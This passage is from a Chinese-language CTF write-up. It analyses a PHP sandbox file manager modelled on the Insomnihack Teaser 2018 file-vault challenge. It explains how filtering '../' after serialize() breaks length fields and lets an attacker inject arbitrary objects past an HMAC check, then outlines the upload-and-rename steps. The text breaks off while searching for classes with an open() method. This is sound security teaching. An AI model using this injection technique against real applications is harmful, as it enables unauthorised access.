            header("Location: index.php?action=home");
            exit;
        case 'open':
            $files = myunserialize($_COOKIE['files'], $secret);
            if(isset($files[$_GET['i']])){
                echo $files[$_GET['i']]->open($files[$_GET['i']]->fakename, $files[$_GET['i']]->realname);
            }
            exit;
        case 'reset':
            setcookie('files', myserialize([], $secret));
            $_COOKIE['files'] = myserialize([], $secret);
            array_map('unlink', glob("$sandbox_dir/*"));
            header("Location: index.php?action=home");
            exit;
    }
查看源码，发现该题目基本类似于[Insomnihack Teaser
2018](https://link.jianshu.com/?t=https%3A%2F%2Fcorb3nik.github.io%2Fblog%2Finsomnihack-teaser-2018%2Ffile-vault)
该题是一个沙盒文件管理器，允许用户上传文件，同时还允许查看文件的元数据。
文件上传通过cookie来保存上传的文件信息。$_COOKIE[‘files’]的值是个反序列化的数组，数组的每个元素是一个UploadFile对象，保存了一个fakename（上传文件的原始名字，可以修改）和一个realname（内容hash值）。
用户可以进行下面五类操作：
  * 主页/home: （查看主页）通过反序列化cookie的值获得上传文件列表，然后显示在前端页面
        case 'home':
        default:
            $content = "";
            $files = myunserialize($_COOKIE['files'], $secret);
            if($files) {
                $content .= "";
                $i = 0;
                foreach($files as $file) {
                    $content .= "fakename)."'>Click to show locations";
                    $i++;
                }
                $content .= "";
            }
            echo $content;
            break;
默认显示上传界面，随后反序列化Cookie存储`files`数组的`UploadFile`对象，遍历显示上传的文件。
  * 上传/upload: （上传新文件）创建对象`UploadFile`保存上传文件，无过滤
        case 'upload':
            if($_SERVER['REQUEST_METHOD'] === "POST") {
                if(isset($_FILES['file'])) {
                    $uploadfile = new UploadFile;
                    $uploadfile->upload($_FILES['file']['name'], file_get_contents($_FILES['file']['tmp_name']));
                    $files = myunserialize($_COOKIE['files'], $secret);
                    $files[] = $uploadfile;
                    setcookie('files', myserialize($files, $secret));
                    header("Location: index.php?action=home");
                    exit;
                }
            }
            break;
创建`UploadFile`对象，调用`upload`方法，传入文件名、文件内容在服务器上进行存储，然后反序列化cookie的files对新创建的文件`uploadfile`对象进行追加存储，之后重新设置cookie重新序列化files。
    class UploadFile {
        function upload($fakename, $content) {
            global $sandbox_dir;
            $info = pathinfo($fakename);
            $ext = isset($info['extension']) ? ".".$info['extension'] : '.txt';
            file_put_contents($sandbox_dir.'/'.sha1($content).$ext, $content);
            $this->fakename = $fakename;
            $this->realname = sha1($content).$ext;
        }
        function open($fakename, $realname) {
            global $sandbox_dir;
            $analysis = "$fakename is in folder $sandbox_dir/$realname.";
            return $analysis;
        }
    }
  * 更改名称/changename:（重命名已上传的文件）修改某个已上传文件的fakename，然后重新序列化
        case 'changename':
            if($_SERVER['REQUEST_METHOD'] === "POST") {
                $files = myunserialize($_COOKIE['files'], $secret);
                if(isset($files[$_GET['i']]) && isset($_POST['newname'])){
                    $files[$_GET['i']]->fakename = $_POST['newname'];
                }
                setcookie('files', myserialize($files, $secret));
            }
            header("Location: index.php?action=home");
            exit;
根据`i`值索引文件对象`UploadFile`，然后更改`fakename`的值，之后重新设置cookie重新序列化files。
  * 打开/open: （查看已上传文件的元数据）输出指定文件的fakename和realname信息
        case 'open':
            $files = myunserialize($_COOKIE['files'], $secret);
            if(isset($files[$_GET['i']])){
                echo $files[$_GET['i']]->open($files[$_GET['i']]->fakename, $files[$_GET['i']]->realname);
            }
            exit;
通过`i`值索引文件对象`UploadFile`，然后调用对象的`open`方法输出指定文件的元数据：`fakename和realname`信息。
  * 重置/reset: （删除特定沙盒中的所文件）清空特定的sandbox
        case 'reset':
            setcookie('files', myserialize([], $secret));
            $_COOKIE['files'] = myserialize([], $secret);
            array_map('unlink', glob("$sandbox_dir/*"));
            header("Location: index.php?action=home");
            exit;
通过空数组设置新的cookie，然后删除`$sandbox_dir/`下的文件。
对于用户的操作，其中的每一个操作，都是在沙盒环境中执行的。这里的沙盒，是程序生成的用户专属文件夹，其生成代码如下：
    $sandbox_dir = 'sandbox/'.sha1($_SERVER['REMOTE_ADDR']);
该沙盒还可以防止PHP执行，以生成的.htaccess文件为例，我们可以看到其中的php_flag engine off指令：
    if(!is_dir($sandbox_dir)) {
        mkdir($sandbox_dir,0777,true);
    }
    if(!is_file($sandbox_dir.'/.htaccess')) {
        file_put_contents($sandbox_dir.'/.htaccess', "php_flag engine off");
    }
针对`UploadFile`类，在上传新文件时，将使用以下属性来创建UploadFile：
fakename：用户上传文件的原始文件名；
realname：自动生成的文件名，用于在磁盘上存储文件。
通过Open操作查看文件时，fakename用于文件名的显示，而在文件系统中所保存的文件，实际上其文件名为realname中的名称。
然后，会将UploadFile对象添加到数组，通过自定义的myserialize()函数对其进行序列化，并通过文件Cookie返回给用户。当用户想要查看文件时，Web应用程序会获取用户的Cookie，通过myunserialized()函数对UploadFile对象的数组反序列化，随后对其进行相应的处理。
下面是UploadFile对象的示例：
    a:2:{i:0;O:10:"UploadFile":2:{s:8:"fakename";s:9:"pictu.jpg";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";}i:1;O:10:"UploadFile":2:{s:8:"fakename";s:7:"qwe.jpg";s:8:"realname";s:44:"75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg";}}f96f37cca80ecae3c5f2f30be497c27024a23a24093e9e7a26c9721be025fb7b
以下是用于生成上述序列化对象的相关代码：
    function myserialize($a, $secret) {
        $b = str_replace("../","./", serialize($a));
        return $b.hash_hmac('sha256', $b, $secret);
    }
    function myunserialize($a, $secret) {
        if(substr($a, -64) === hash_hmac('sha256', substr($a, 0, -64), $secret)){
            return unserialize(substr($a, 0, -64));
        }
    }
    class UploadFile {
        function upload($fakename, $content) {
            global $sandbox_dir;
            $info = pathinfo($fakename);
            $ext = isset($info['extension']) ? ".".$info['extension'] : '.txt';
            file_put_contents($sandbox_dir.'/'.sha1($content).$ext, $content);
            $this->fakename = $fakename;
            $this->realname = sha1($content).$ext;
        }
        function open($fakename, $realname) {
            global $sandbox_dir;
            $analysis = "$fakename is in folder $sandbox_dir/$realname.";
            return $analysis;
        }
    }
    switch($_GET['action']){
        case 'open':
            $files = myunserialize($_COOKIE['files'], $secret);
            if(isset($files[$_GET['i']])){
                echo $files[$_GET['i']]->open($files[$_GET['i']]->fakename, $files[$_GET['i']]->realname);
            }
            exit;
    }
因为每次建立sandbox的时候，都会在目录加上一个`.htaccess`文件来限制php的执行，因此我们无法直接上传shell。同时由于在序列化和反序列化的时候做了签名，我们也不能直接通过修改cookie的方式来改变对象。
由于源代码中没有wakeup()或destruct()这样的magic函数，因此我们不能使用常用的一些反序列化攻击方法。
**发现漏洞：破坏序列化对象**
随着继续的审计和探索，发现应用程序中的漏洞：
    function myserialize($a, $secret) {
        $b = str_replace("../","./", serialize($a));
        return $b.hash_hmac('sha256', $b, $secret);
    }
    function myunserialize($a, $secret) {
        if(substr($a, -64) === hash_hmac('sha256', substr($a, 0, -64), $secret)){
            return unserialize(substr($a, 0, -64));
        }
    }
代码的作者添加了一个`str_replace()`调用，用来过滤掉`../`序列。这就存在一个问题，`str_replace`调用是在一个序列化的对象上执行的，而不是一个字符串。
比如有这么一个序列化后的字符串
    php > $array = array();
    php > $array[] = "../";
    php > $array[] = "hello";
    php > echo serialize($array);
    a:2:{i:0;s:3:"../";i:1;s:5:"hello";}
在myserialize函数（`../过滤器`）处理后就变成了
    php > echo str_replace("../","./", serialize($array));
    a:2:{i:0;s:3:"./";i:1;s:5:"hello";}
通过过滤，确实已经将`“../”`改为了`“./”`，然而，序列化字符串的大小并没有改变。`s:3:”./“;`显示的字符串大小为3，然而实际上它的大小是2！!
当这个损坏的对象被unserialize()处理时，PHP会将序列化对象(`“`)中的下一个字符视为其值的一部分，而从这之后，反序列化就会出错：
    a:2:{i:0;s:3:"./";i:1;s:5:"hello";}
               ^  ---  $array = array();
    php > $array[] = "../../../../../../../../../../../../../";
    php > $array[] = 'A";i:1;s:8:"Injected';
    php > echo serialize($array);
    a:2:{i:0;s:39:"../../../../../../../../../../../../../";i:1;s:20:"A";i:1;s:8:"Injected";}
对于这个序列化的字符串，处理以后为：
    php > $x = str_replace("../", "./", serialize($array));
    php > echo $x;
    a:2:{i:0;s:39:"./././././././././././././";i:1;s:20:"A";i:1;s:8:"Injected";}
                   ---------------------------------------           --------    
    php > print_r(unserialize($x));
    Array
    (
        [0] => ./././././././././././././";i:1;s:20:"A
        [1] => Injected
    )
这个时候，s:39对应的字符串变成了`./././././././././././././";i:1;s:20:"A`，这样就把本来不应该有的Injected引入了进来。在这个例子中，使用的字符串是“i:1;s:8:”Injected”，但同样，任何基元/对象都可以在这里使用。
继续回到题目本身，情况与之几乎相同。我们需要的就是一个数组，该题中正是`UploadFile`对象数组，在这个数组中我们可以破坏第一个对象，从而控制第二个对象。
我们可以通过上传两个文件来实现漏洞的利用。就像上面的例子一样，我们具体操作如下：
  * 上传两个文件，创建两个VaultFile对象；
  * 用部分序列化的对象，重命名第二个UploadFile对象中的fakename；
  * 借助`../`序列，重命名第一个UploadFile对象中的fakename，使其到达第二个UploadFile对象。
请注意，由于我们现在使用的是Web应用程序的正常功能来执行上述操作，所以就不用再考虑签名的问题，这些操作一定是合法的。
由于`myserialize`的问题，如果我们有一个可控点，就可以尝试引入非法的对象。这个可控点就是changename，changename会修改fakename的值同时重新序列化对象
**使用任意数据伪造序列化对象**
通过上面的探索，现在，就可以使用任意数据，来伪造我们自己的序列化对象。在这一步骤中，我们需要解决的是一个经典的对象注入问题，但在这里，并没有太多技巧或者捷径可以供我们使用。
到目前为止，我们几乎已经用到了应用中所有的功能，但还有一个没有用过，那就是Open。以下是Open的相关代码：
        function open($fakename, $realname) {
            global $sandbox_dir;
            $analysis = "$fakename is in folder $sandbox_dir/$realname.";
            return $analysis;
        }
        case 'open':
            $files = myunserialize($_COOKIE['files'], $secret);
            if(isset($files[$_GET['i']])){
                echo $files[$_GET['i']]->open($files[$_GET['i']]->fakename, $files[$_GET['i']]->realname);
            }
            exit;
Open操作通过`i`索引会从$files数组中获取一个对象，并使用$object->fakename和$object->realname这两个参数来调用open()函数。
通过上面知道，可以在$files数组中注入任何对象（就像之前注入的“Injected”字符串一样）。但如果我们注入的不是UploadFile对象，会发生什么？
其实可以看到，open()这一方法名是非常常见的。如果我们能够在PHP中找到一个带有open()方法的标准类，那么就可以欺骗Web应用去调用这个类的open()方法，而不再调用UploadFile中的方法。
简单来看可以理解为下面的实例过程
    open($array[0]->fakename, $array[0]->realname);
可以通过欺骗Web应用程序，来实现这一点，从而实现类的欺骗，调用其它类的相同方法：
    open($array[0]->fakename, $array[0]->realname);
既然可以这样操作那么下来就是要寻找有那些类包含open()方法，从而实现后续的利用
通过原WP，编写代码列出所有包含open()方法的类：
    $ cat list.php
    <?php
      foreach (get_declared_classes() as $class) {
        foreach (get_class_methods($class) as $method) {
          if ($method == "open")